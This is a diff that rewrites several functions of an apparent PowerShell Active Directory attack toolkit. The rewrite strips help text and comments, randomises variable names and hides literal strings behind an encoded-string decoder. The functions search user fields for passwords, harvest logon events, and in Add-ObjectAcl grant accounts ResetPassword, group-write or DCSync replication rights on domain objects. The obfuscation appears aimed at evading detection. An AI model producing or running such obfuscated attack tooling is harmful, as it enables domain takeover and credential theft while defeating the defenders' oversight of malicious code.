-    .PARAMETER SearchField
-
-        User field to search, default of "description".
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER Domain
-
-        Domain to search computer fields for, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Find-UserField -SearchField info -SearchTerm backup
-
-        Find user accounts with "backup" in the "info" field.
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Position=0,ValueFromPipeline=$True)]
         [String]
         $SearchTerm = 'pass',
-
         [String]
         $SearchField = 'description',
-
         [String]
         $ADSpath,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     process {
-        Get-NetUser -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Filter ("(" + $SearchField + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PSo="))) + $SearchTerm + ([char]0x2a+[char]0x29)) -PageSize $PageSize | Select-Object samaccountname,$SearchField
+        Get-NetUser -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Filter ("(" + $SearchField + ([char]0x3d+[char]0x2a) + $SearchTerm + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kik=")))) -PageSize $PageSize | Select-Object samaccountname,$SearchField
     }
 }
-
-
 function Get-UserEvent {
-<#
-    .SYNOPSIS
-
-        Dump and parse security events relating to an account logon (ID 4624)
-        or a TGT request event (ID 4768). Intended to be used and tested on
-        Windows 2008 Domain Controllers.
-        Admin Reqd? YES
-
-        Author: @sixdub
-
-    .PARAMETER ComputerName
-
-        The computer to get events from. Default: Localhost
-
-    .PARAMETER EventType
-
-        Either 'logon', 'tgt', or 'all'. Defaults: 'logon'
-
-    .PARAMETER DateStart
-
-        Filter out all events before this date. Default: 5 days
-   
-    .EXAMPLE
-
-        PS C:\> Get-UserEvent -ComputerName DomainController.testlab.local
-
-    .LINK
-
-        http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
-#>
-
     Param(
         [String]
         $ComputerName = $Env:ComputerName,
-
         [String]
-        [ValidateSet((HandleResult95 @(191,11,239,135,150,149,194,75) @(221,76,214,233,244,167,246,118)),(HandleResult95 @(97,201,80,97) @(5,142,52,81,102)),(HandleResult95 @(21,80,10,58) @(76,7,114,73,1,53)))]
-        $EventType = (HandleResult95 @(208,60,13,55,238,128,79,9) @(178,123,52,89,140)),
-
+        [ValidateSet((ParseEntry20 @(18,176,105,29,165,66,195,109) @(112,247,80,115,199)),(ParseEntry20 @(106,28,101,121) @(14,91,1,73,27)),(ParseEntry20 @(186,54,87,63) @(227,97,47,76,237,63)))]
+        $EventType = (ParseEntry20 @(196,203,221,192,183,214,146,177) @(166,140,228,174,213,228)),
         [DateTime]
         $DateStart=[DateTime]::Today.AddDays(-5)
     )
-
-    if($EventType.ToLower() -like (HandleResult95 @(147,120,145,37,76,229,197,2) @(241,63,168,75,46,215))) {
-        [Int32[]]$tLgTK = @(4624)
+    if($EventType.ToLower() -like (ParseEntry20 @(172,102,1,105,138,39,10,241) @(206,33,56,7,232,21,62,204))) {
+        [Int32[]]$UGG1oI9 = @(4624)
     }
-    elseif($EventType.ToLower() -like (HandleResult95 @(95,79,112,24) @(59,8,20,40,86,140,216))) {
-        [Int32[]]$tLgTK = @(4768)
+    elseif($EventType.ToLower() -like (ParseEntry20 @(184,197,192,41) @(220,130,164,25,47,160,181))) {
+        [Int32[]]$UGG1oI9 = @(4768)
     }
     else {
-        [Int32[]]$tLgTK = @(4624, 4768)
+        [Int32[]]$UGG1oI9 = @(4624, 4768)
     }
-
-    #grab all events matching our filter for the specified host
-    Get-WinEvent -ComputerName $ComputerName -FilterHashTable @{ LogName = 'Security'; ID=$tLgTK; StartTime=$DateStart} -ErrorAction SilentlyContinue | ForEach-Object {
-
-        if($tLgTK -contains 4624) {    
-            # first parse and check the logon event type. This could be later adapted and tested for RDP logons (type 10)
+    Get-WinEvent -ComputerName $ComputerName -FilterHashTable @{ LogName = 'Security'; ID=$UGG1oI9; StartTime=$DateStart} -ErrorAction SilentlyContinue | ForEach-Object {
+        if($UGG1oI9 -contains 4624) {    
             if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))') {
                 if($Matches) {
-                    $Cv9eCCP = $Matches[0].trim()
+                    $fosx4sVb = $Matches[0].trim()
                     $Matches = $Null
                 }
             }
             else {
-                $Cv9eCCP = ""
+                $fosx4sVb = ""
             }
-
-            # interactive logons or domain logons
-            if (($Cv9eCCP -eq 2) -or ($Cv9eCCP -eq 3)) {
+            if (($fosx4sVb -eq 2) -or ($fosx4sVb -eq 3)) {
                 try {
-                    # parse and store the account used and the address they came from
                     if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)') {
                         if($Matches) {
                             $UserName = $Matches[0].split(([char]0x0a))[2].split(":")[1].trim()
-                            $Domain = $Matches[0].split(([char]0x0a))[3].split(":")[1].trim()
+                            $Domain = $Matches[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Cg=="))))[3].split(":")[1].trim()
                             $Matches = $Null
                         }
                     }
                     if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)') {
                         if($Matches) {
-                            $vEfX4aEW = $Matches[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Cg=="))))[2].split(":")[1].trim()
+                            $BHVNz9LV = $Matches[0].split(([char]0x0a))[2].split(":")[1].trim()
                             $Matches = $Null
                         }
                     }
-
-                    # only add if there was account information not for a machine or anonymous logon
                     if ($UserName -and (-not $UserName.endsWith('$')) -and ($UserName -ne 'ANONYMOUS LOGON')) {
-                        $Tdjm4byC = @{
+                        $Y9NL = @{
                             'Domain' = $Domain
                             'ComputerName' = $ComputerName
                             'Username' = $UserName
-                            'Address' = $vEfX4aEW
+                            'Address' = $BHVNz9LV
                             'ID' = '4624'
-                            'LogonType' = $Cv9eCCP
+                            'LogonType' = $fosx4sVb
                             'Time' = $_.TimeCreated
                         }
-                        New-Object -TypeName PSObject -Property $Tdjm4byC
+                        New-Object -TypeName PSObject -Property $Y9NL
                     }
                 }
                 catch {
-                    Write-Debug ((HandleResult95 @(230,218,139,104,120,254,99,211,225,134,87,99,174,24,216,247,155,104,88,161,78,217,212,180,117,89,143,89,214,176,165,107,85,164,107,137) @(180,130,193,17,26,205,42)) + $_)
+                    Write-Debug ((ParseEntry20 @(28,99,89,177,214,125,114,116,171,243,8,66,112,250,216,59,97,106,138,216,42,86,69,189,208,13,121,96,170,134,42,65,92,161,245,115) @(78,59,19,200,180)) + $_)
                 }
             }
         }
-        if($tLgTK -contains 4768) {
-            # the TGT event type
+        if($UGG1oI9 -contains 4768) {
             try {
                 if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)') {
                     if($Matches) {
@@ -2680,209 +1395,119 @@ function Get-UserEvent {
                         $Matches = $Null
                     }
                 }
-
                 if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)') {
                     if($Matches) {
-                        $vEfX4aEW = $Matches[0].split(([char]0x0a))[1].split(":")[-1].trim()
+                        $BHVNz9LV = $Matches[0].split(([char]0x0a))[1].split(":")[-1].trim()
                         $Matches = $Null
                     }
                 }
-
-                $Tdjm4byC = @{
+                $Y9NL = @{
                     'Domain' = $Domain
                     'ComputerName' = $ComputerName
                     'Username' = $UserName
-                    'Address' = $vEfX4aEW
+                    'Address' = $BHVNz9LV
                     'ID' = '4768'
                     'LogonType' = ''
                     'Time' = $_.TimeCreated
                 }
-
-                New-Object -TypeName PSObject -Property $Tdjm4byC
+                New-Object -TypeName PSObject -Property $Y9NL
             }
             catch {
-                Write-Debug ((HandleResult95 @(150,3,118,42,55,90,141,60,95,20,19,16,167,105,80,38,15,16,134,55,88,62,3,28,160,24,126,32,55,91,160,33,115,58,20,84) @(196,91,60,83,85,105)) + $_)
+                Write-Debug ((ParseEntry20 @(61,187,96,98,146,190,7,8,128,109,93,137,238,124,3,150,112,98,178,225,42,2,181,95,127,179,207,61,13,209,78,97,191,228,15,82) @(111,227,42,27,240,141,78)) + $_)
             }
         }
     }
 }
-
-
 function Get-ObjectAcl {
-<#
-    .SYNOPSIS
-        Returns the ACLs associated with a specific active directory object.
-
-        Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.
-
-    .PARAMETER SamAccountName
-
-        Object name to filter for.        
-
-    .PARAMETER Name
-
-        Object name to filter for.
-
-    .PARAMETER DistinguishedName
-
-        Object distinguished name to filter for.
-
-    .PARAMETER ResolveGUIDs
-
-        Switch. Resolve GUIDs to their display names.
-
-    .PARAMETER Filter
-
-        A customized ldap filter string to use, e.g. "(description=*admin*)"
-     
-    .PARAMETER ADSpath
-
-        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER ADSprefix
-
-        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")
-
-    .PARAMETER RightsFilter
-
-        Only return results with the associated rights, "All", "ResetPassword","WriteMembers"
-
-    .PARAMETER Domain
-
-        The domain to use for the query, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-ObjectAcl -SamAccountName matt.admin -domain testlab.local
-        
-        Get the ACLs for the matt.admin user in the testlab.local domain
-
-    .EXAMPLE
-
-        PS C:\> Get-ObjectAcl -SamAccountName matt.admin -domain testlab.local -ResolveGUIDs
-        
-        Get the ACLs for the matt.admin user in the testlab.local domain and
-        resolve relevant GUIDs to their display names.
-#>
-
     [CmdletBinding()]
     Param (
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $SamAccountName,
-
         [String]
         $Name = "*",
-
         [Alias('DN')]
         [String]
         $DistinguishedName = "*",
-
         [Switch]
         $ResolveGUIDs,
-
         [String]
         $Filter,
-
         [String]
         $ADSpath,
-
         [String]
         $ADSprefix,
-
         [String]
-        [ValidateSet((HandleResult95 @(180,147,4,60) @(229,196,124,79,85,132,120,49)),(HandleResult95 @(122,147,5,87,154,215,20,126,167,11,99,186,235,116,22,135,9,108,253,178) @(47,254,83,45,192,143,70)),(HandleResult95 @(153,12,176,184,171,120,172,134,149,104,203,161,149,103,176,178) @(207,63,250,200)))]
+        [ValidateSet((ParseEntry20 @(203,5,124,11) @(154,82,4,120,152,14,227,100)),(ParseEntry20 @(252,157,249,113,218,67,243,248,169,247,69,250,127,147,144,137,245,74,189,38) @(169,240,175,11,128,27,161)),(ParseEntry20 @(207,172,164,20,64,222,201,160,62,115,168,246,180,60,110,227) @(153,159,238,100,36)))]
         $RightsFilter,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     begin {
-        $rW6p = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $ADSprefix -PageSize $PageSize
-
-        # get a GUID -> name mapping
+        $TRb13UTh = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $ADSprefix -PageSize $PageSize
         if($ResolveGUIDs) {
-            $NbbUfhH = Get-GUIDMap -Domain $Domain -DomainController $DomainController -PageSize $PageSize
+            $Pt0LtPu8 = Get-GUIDMap -Domain $Domain -DomainController $DomainController -PageSize $PageSize
         }
     }
-
     process {
-
-        if ($rW6p) {
-
+        if ($TRb13UTh) {
             if($SamAccountName) {
-                $rW6p.filter=((HandleResult95 @(228,24,106,135,0,10,233,47,106,191,45,82,205,104,101,157,7,127,154,51,81,191,54,1) @(175,91,51,232,99,56)) + $SamAccountName + (HandleResult95 @(98,191,22,168,76,210,24,128,46,140,40,184) @(41,236,126,221,21,133)) + $Name + (HandleResult95 @(177,164,216,244,155,175,254,175,155,160,133,241,158,160,220,229,155,176,230,244,152,154,246,235,160,163,128,162) @(250,247,176,159)) + $DistinguishedName + ")" + $Filter + ")")  
+                $TRb13UTh.filter=((ParseEntry20 @(21,151,57,101,10,108,146,20,83,62,16,190,2,57,63,43,176,39,63,1,60,131,53,51) @(94,212,96,10,105)) + $SamAccountName + (ParseEntry20 @(122,194,60,72,196,125,20,45,97,192,105,0) @(49,145,84,61,157,42,37,65)) + $Name + (ParseEntry20 @(159,47,119,206,148,28,168,228,29,72,144,155,32,177,184,6,126,226,163,47,132,185,58,107,255,161,116,219) @(212,124,31,165,245,68,230)) + $DistinguishedName + ")" + $Filter + ")")  
             }
             else {
-                $rW6p.filter=((HandleResult95 @(115,174,117,182,180,156,126,153,118,141,230,204) @(56,237,44,217,214,241)) + $Name + (HandleResult95 @(160,245,82,125,18,145,165,150,91,65,70,167,143,241,86,108,18,142,189,205,88,123,53,189,177,242,10,43) @(235,166,58,22,115,201)) + $DistinguishedName + ")" + $Filter + ")")  
+                $TRb13UTh.filter=((ParseEntry20 @(1,57,135,209,40,23,152,202,16,46,238,131) @(74,122,222,190)) + $Name + (ParseEntry20 @(253,250,154,15,94,199,0,134,200,165,81,81,251,25,218,211,147,35,105,244,44,219,239,134,62,107,175,115) @(182,169,242,100,63,159,78)) + $DistinguishedName + ")" + $Filter + ")")  
             }
-  
             try {
-                $rW6p.FindAll() | Where-Object {$_} | Foreach-Object {
+                $TRb13UTh.FindAll() | Where-Object {$_} | Foreach-Object {
                     $Object = [adsi]($_.path)
                     if($Object.distinguishedname) {
-                        $Pu7AlyM = $Object.PsBase.ObjectSecurity.access
-                        $Pu7AlyM | ForEach-Object {
+                        $X2ndzV = $Object.PsBase.ObjectSecurity.access
+                        $X2ndzV | ForEach-Object {
                             $_ | Add-Member NoteProperty 'ObjectDN' ($Object.distinguishedname[0])
-
                             if($Object.objectsid[0]){
-                                $SUES9Df7 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
+                                $L68q2oB5 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                             }
                             else {
-                                $SUES9Df7 = $Null
+                                $L68q2oB5 = $Null
                             }
-                            
-                            $_ | Add-Member NoteProperty 'ObjectSID' $SUES9Df7
+                            $_ | Add-Member NoteProperty 'ObjectSID' $L68q2oB5
                             $_
                         }
                     }
                 } | ForEach-Object {
                     if($RightsFilter) {
-                        $VTpe = Switch ($RightsFilter) {
-                            (HandleResult95 @(240,85,149,181,8,8,174,106,252,96,141,181,54,98,197,66,255,121,254,242) @(165,56,195,207,82,80,252,59)) { (HandleResult95 @(205,56,50,146,142,212,23,66,165,187,193,8,62,129,144,178,38,48,219,185,205,43,34,156,141,215,57,64,165,171,231,8,62,175,131,232,37,39,170,182,206,17,38,156,143,212,53,70) @(128,124,115,235,193)) }
-                            (HandleResult95 @(225,229,43,158,69,183,112,249,140,54,223,72,170,126,253,172) @(183,214,97,238,33,240,38)) { (HandleResult95 @(32,210,30,54,141,175,197,76,230,61,66,183,136,225,43,211,9,106,243,189,235,46,238,48,79,148,128,223,54,251,18,119,142,129,228,17,230,19,66,180,136,220,56,143,8,84,150,188) @(121,191,71,3,195,197,166)) }
-                            Default { (HandleResult95 @(44,154,156,35,177,17,32,169,144,16,189,33,44,154,156,35,177,22,81,169,144,16,189,34,45,138,156,35,177,17,32,170,144,16,189,34,44,154,156,35,177,17,32,169,144,16,189,34) @(97,222,221,84,252,85))}
+                        $N40SS = Switch ($RightsFilter) {
+                            (ParseEntry20 @(66,44,67,247,71,79,19,68,212,69,89,59,113,191,36,110,27,84,176,32) @(23,65,21,141,29)) { (ParseEntry20 @(197,145,254,65,251,2,227,228,241,66,245,34,197,191,238,10,238,21,184,173,242,111,229,33,196,130,250,11,250,60,239,161,242,124,246,62,209,129,254,79,250,59,221,162,241,108,253,99) @(136,213,191,56,180,86)) }
+                            (ParseEntry20 @(16,119,32,58,192,26,143,8,30,61,123,205,7,129,12,62) @(70,68,106,74,164,93,217)) { (ParseEntry20 @(28,231,37,11,80,248,38,191,37,68,95,230,8,205,46,82,80,251,117,242,49,105,79,229,9,221,57,71,81,214,16,254,49,122,92,250,28,222,61,73,83,232,4,186,51,105,75,235) @(69,138,124,62,30,146)) }
+                            Default { (ParseEntry20 @(140,123,228,32,213,186,128,72,232,19,217,138,140,123,228,32,213,189,241,72,232,19,217,137,141,107,228,32,213,186,128,75,232,19,217,137,140,123,228,32,213,186,128,72,232,19,217,137) @(193,63,165,87,152,254))}
                         }
-                        if($_.ObjectType -eq $VTpe) { $_ }
+                        if($_.ObjectType -eq $N40SS) { $_ }
                     }
                     else {
                         $_
                     }
                 } | Foreach-Object {
-                    if($NbbUfhH) {
-                        # if we're resolving GUIDs, map them them to the resolved hash table
-                        $gakRu = @{}
+                    if($Pt0LtPu8) {
+                        $wvTu5 = @{}
                         $_.psobject.properties | ForEach-Object {
                             if( ($_.Name -eq 'ObjectType') -or ($_.Name -eq 'InheritedObjectType') ) {
                                 try {
-                                    $gakRu[$_.Name] = $NbbUfhH[$_.Value.toString()]
+                                    $wvTu5[$_.Name] = $Pt0LtPu8[$_.Value.toString()]
                                 }
                                 catch {
-                                    $gakRu[$_.Name] = $_.Value
+                                    $wvTu5[$_.Name] = $_.Value
                                 }
                             }
                             else {
-                                $gakRu[$_.Name] = $_.Value
+                                $wvTu5[$_.Name] = $_.Value
                             }
                         }
-                        New-Object -TypeName PSObject -Property $gakRu
+                        New-Object -TypeName PSObject -Property $wvTu5
                     }
                     else { $_ }
                 }
@@ -2893,858 +1518,362 @@ function Get-ObjectAcl {
         }
     }
 }
-
-
 function Add-ObjectAcl {
-<#
-    .SYNOPSIS
-
-        Adds an ACL for a specific active directory object.
-        
-        AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3)
-            https://adsecurity.org/?p=1906
-
-        ACE setting method adapted from https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects.
-
-        'ResetPassword' doesn't need to know the user's current password
-        'WriteMembers' allows for the modification of group membership
-
-    .PARAMETER TargetSamAccountName
-
-        Target object name to filter for.        
-
-    .PARAMETER TargetName
-
-        Target object name to filter for.
-
-    .PARAMETER TargetDistinguishedName
-
-        Target object distinguished name to filter for.
-
-    .PARAMETER TargetFilter
-
-        A customized ldap filter string to use to find a target, e.g. "(description=*admin*)"
-
-    .PARAMETER TargetADSpath
-
-        The LDAP source for the target, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-
-    .PARAMETER TargetADSprefix
-
-        Prefix to set for the target searcher (like "CN=Sites,CN=Configuration")
-
-    .PARAMETER PrincipalSID
-
-        The SID of the principal object to add for access.
-
-    .PARAMETER PrincipalName
-
-        The name of the principal object to add for access.
-
-    .PARAMETER PrincipalSamAccountName
-
-        The samAccountName of the principal object to add for access.
-
-    .PARAMETER Rights
-
-        Rights to add for the principal, "All","ResetPassword","WriteMembers","DCSync"
-
-    .PARAMETER Domain
-
-        The domain to use for the target query, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        Add-ObjectAcl -TargetSamAccountName matt -PrincipalSamAccountName john
-
-        Grants 'john' all full access rights to the 'matt' account.
-
-    .EXAMPLE
-
-        Add-ObjectAcl -TargetSamAccountName matt -PrincipalSamAccountName john -Rights ResetPassword
-
-        Grants 'john' the right to reset the password for the 'matt' account.
-
-    .LINK
-
-        https://adsecurity.org/?p=1906
-        
-        https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
-#>
-
     [CmdletBinding()]
     Param (
         [String]
         $TargetSamAccountName,
-
         [String]
         $TargetName = "*",
-
         [Alias('DN')]
         [String]
         $TargetDistinguishedName = "*",
-
         [String]
         $TargetFilter,
-
         [String]
         $TargetADSpath,
-
         [String]
         $TargetADSprefix,
-
         [String]
         [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
         $PrincipalSID,
-
         [String]
         $PrincipalName,
-
         [String]
         $PrincipalSamAccountName,
-
         [String]
-        [ValidateSet((HandleResult95 @(38,129,127,183) @(119,214,7,196)),(HandleResult95 @(67,69,93,253,61,177,142,89,79,112,69,253,3,219,229,113,76,105,54,186) @(22,40,11,135,103,233,220,8)),(HandleResult95 @(165,151,20,150,16,180,242,16,188,35,194,205,4,190,62,137) @(243,164,94,230,116)),(HandleResult95 @(140,241,178,123,243,137,129,150) @(222,180,252,47,150)))]
-        $Rights = (HandleResult95 @(249,144,189,165) @(168,199,197,214,90,149,175,130)),
-
+        [ValidateSet((ParseEntry20 @(53,143,238,220) @(100,216,150,175,193)),(ParseEntry20 @(22,49,191,106,25,4,187,65,26,4,167,106,39,110,208,105,25,29,212,45) @(67,92,233,16)),(ParseEntry20 @(65,106,111,167,167,205,191,89,3,114,230,170,208,177,93,35) @(23,89,37,215,195,138,233)),(ParseEntry20 @(146,35,218,181,243,127,32,170) @(192,102,148,225,150,40,21)))]
+        $Rights = (ParseEntry20 @(254,197,22,42) @(175,146,110,89,45,79)),
         [String]
         $RightsGUID,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     begin {
-        $rW6p = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $TargetADSpath -ADSprefix $TargetADSprefix -PageSize $PageSize
-
+        $TRb13UTh = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $TargetADSpath -ADSprefix $TargetADSprefix -PageSize $PageSize
         if(!$PrincipalSID) {
-            $DPBWW = Get-ADObject -Domain $Domain -DomainController $DomainController -Name $PrincipalName -SamAccountName $PrincipalSamAccountName -PageSize $PageSize
-            
-            if(!$DPBWW) {
-                throw (HandleResult95 @(208,34,168,95,140,17,80,190,225,23,180,92,140,16,97,235,227,45,215,72,167,106,91,160,227,45,215,76,143,122,91,177,224,59,223,27) @(130,122,226,38,238,34,25,217))
+            $pn5JfG = Get-ADObject -Domain $Domain -DomainController $DomainController -Name $PrincipalName -SamAccountName $PrincipalSamAccountName -PageSize $PageSize
+            if(!$pn5JfG) {
+                throw (ParseEntry20 @(16,132,145,83,164,85,41,37,191,182,124,188,4,82,58,238,186,125,243,8,41,10,158,162,75,145,83,10,35,132,153,66,164,39,93,127) @(66,220,219,42,198,102,96))
             }
-            $PrincipalSID = $DPBWW.objectsid
+            $PrincipalSID = $pn5JfG.objectsid
         }
         if(!$PrincipalSID) {
-            throw (HandleResult95 @(34,169,72,171,18,194,75,181,19,156,84,168,18,195,122,224,17,166,55,188,57,185,64,171,17,166,55,184,17,169,64,186,18,176,63,239) @(112,241,2,210))
+            throw (ParseEntry20 @(45,194,140,56,147,195,165,24,249,171,23,139,146,222,7,168,167,22,196,158,165,55,216,191,32,166,197,134,30,194,132,41,147,177,209,66) @(127,154,198,65,241,240,236))
         }
     }
-
     process {
-
-        if ($rW6p) {
-
+        if ($TRb13UTh) {
             if($TargetSamAccountName) {
-                $rW6p.filter=((HandleResult95 @(84,154,67,128,95,45,159,110,182,107,81,179,120,220,106,106,189,93,218,84,125,142,79,214) @(31,217,26,239,60)) + $TargetSamAccountName + (HandleResult95 @(37,119,42,51,121,235,40,48,62,117,127,123) @(110,36,66,70,32,188,25,92)) + $TargetName + (HandleResult95 @(248,159,35,131,78,136,253,252,42,191,26,190,215,155,39,146,78,151,229,167,41,133,105,164,233,152,123,213) @(179,204,75,232,47,208)) + $TargetDistinguishedName + ")" + $TargetFilter + ")")  
+                $TRb13UTh.filter=((ParseEntry20 @(237,164,101,153,106,27,224,147,101,161,71,67,196,212,106,131,109,110,147,143,94,161,92,16) @(166,231,60,246,9,41)) + $TargetSamAccountName + (ParseEntry20 @(231,206,181,222,65,221,157,241,141,250,37,183) @(172,157,221,171,24,138)) + $TargetName + (ParseEntry20 @(28,79,55,227,14,168,241,103,125,8,189,1,148,232,59,102,62,207,57,155,221,58,90,43,210,59,192,130) @(87,28,95,136,111,240,191)) + $TargetDistinguishedName + ")" + $TargetFilter + ")")  
             }
             else {
-                $rW6p.filter=((HandleResult95 @(59,99,88,225,207,28,248,49,42,116,49,179) @(112,32,1,142,173,113,190,69)) + $TargetName + (HandleResult95 @(218,142,170,123,154,123,223,237,163,71,206,77,245,138,174,106,154,100,199,182,160,125,189,87,203,137,242,45) @(145,221,194,16,251,35)) + $TargetDistinguishedName + ")" + $TargetFilter + ")")  
+                $TRb13UTh.filter=((ParseEntry20 @(182,90,8,123,195,144,95,37,78,245,205,36) @(253,25,81,20,161)) + $TargetName + (ParseEntry20 @(98,119,130,116,6,61,105,223,72,115,223,113,3,50,75,149,72,99,188,116,5,8,97,155,115,112,218,34) @(41,36,234,31,103,101,39,239)) + $TargetDistinguishedName + ")" + $TargetFilter + ")")  
             }
-  
             try {
-                $rW6p.FindAll() | Where-Object {$_} | Foreach-Object {
-                    # adapted from https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects
-
-                    $wLA0nXri = $_.Properties.distinguishedname
-
-                    $aQGrugN1 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalSID)
-                    $uuNJ15 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] (HandleResult95 @(166,246,133,72,169,82,53,169) @(242,155,188,61,243,3,8,148))
-                    $qbPIH = [System.Security.AccessControl.AccessControlType] (HandleResult95 @(101,96,111,251,86,4,116,181) @(52,55,23,136))
-                    $ZxhUCQ = @()
-
+                $TRb13UTh.FindAll() | Where-Object {$_} | Foreach-Object {
+                    $sVpPS0bg = $_.Properties.distinguishedname
+                    $UT78Rwq = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalSID)
+                    $jAAu5h = [System.DirectoryServices.ActiveDirectorySecurityInheritance] (ParseEntry20 @(153,44,235,221,81,102,240,124) @(205,65,210,168,11,55))
+                    $bIhId = [System.Security.AccessControl.AccessControlType] (ParseEntry20 @(13,221,249,26,62,185,226,84) @(92,138,129,105))
+                    $BhqND4 = @()
                     if($RightsGUID) {
-                        $NbbUfhH = @($RightsGUID)
+                        $Pt0LtPu8 = @($RightsGUID)
                     }
                     else {
-                        $NbbUfhH = Switch ($Rights) {
-                            # ResetPassword doesn't need to know the user's current password
-                            (HandleResult95 @(80,182,31,224,171,93,137,24,195,169,75,161,45,168,200,124,129,8,167,204) @(5,219,73,154,241)) { (HandleResult95 @(9,65,74,142,128,105,47,52,69,141,142,73,9,111,90,197,149,126,116,125,70,160,158,74,8,82,78,196,129,87,35,113,70,179,141,85,29,81,74,128,129,80,17,114,69,163,134,8) @(68,5,11,247,207,61)) }
-                            # allows for the modification of group membership
-                            (HandleResult95 @(224,7,234,160,210,115,246,158,236,99,145,185,236,108,234,170) @(182,52,160,208)) { (HandleResult95 @(156,150,242,222,86,217,75,240,162,209,170,108,254,111,151,151,229,130,40,203,101,146,170,220,167,79,246,81,138,191,254,159,85,247,106,173,162,255,170,111,254,82,132,203,228,188,77,202) @(197,251,171,235,24,179,40)) }
-                            # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
-                            # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
-                            # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
-                            #   when applied to a domain's ACL, allows for the use of DCSync
-                            (HandleResult95 @(133,3,254,15,0,1,226,44) @(215,70,176,91,101,86)) { (HandleResult95 @(231,113,191,10,11,178,177,136,243,114,191,4,9,178,165,205,228,92,202,8,11,178,185,194,230,114,163,67,9,178,177,206,231,97,184,26,11,161,186,215,243,95,176,27,31,215,185,195) @(170,37,250,112,70,229,232,186)), (HandleResult95 @(238,106,150,201,131,30,163,145,103,132,226,186,6,173,238,73,157,202,254,49,183,244,111,171,255,153,16,201,236,105,138,199,131,13,184,201,115,151,225,163,16,128,233,85,138,129,159,48) @(163,62,211,179,206,73,250)), (HandleResult95 @(191,137,239,74,55,124,166,164,205,92,33,92,190,137,210,22,34,107,192,253,218,92,33,81,188,153,232,19,53,127,181,185,206,97,34,64,169,255,201,74,34,111,181,255,205,98,58,66) @(240,205,131,38,120,40))}
+                        $Pt0LtPu8 = Switch ($Rights) {
+                            (ParseEntry20 @(144,153,67,59,116,157,166,68,24,118,139,142,113,115,23,188,174,84,124,19) @(197,244,21,65,46)) { (ParseEntry20 @(72,25,150,218,244,74,110,108,153,217,250,106,72,55,134,145,225,93,53,37,154,244,234,105,73,10,146,144,245,116,98,41,154,231,249,118,92,9,150,212,245,115,80,42,153,247,242,43) @(5,93,215,163,187,30)) }
+                            (ParseEntry20 @(138,17,152,20,150,223,249,146,120,133,85,155,194,247,150,88) @(220,34,210,100,242,152,175)) { (ParseEntry20 @(92,103,233,71,75,96,211,71,92,112,241,6,72,77,226,30,75,99,128,10,72,93,225,5,73,93,245,11,74,78,229,6,72,78,242,26,92,94,241,5,72,112,241,66,74,93,229,11) @(5,10,176,114)) }
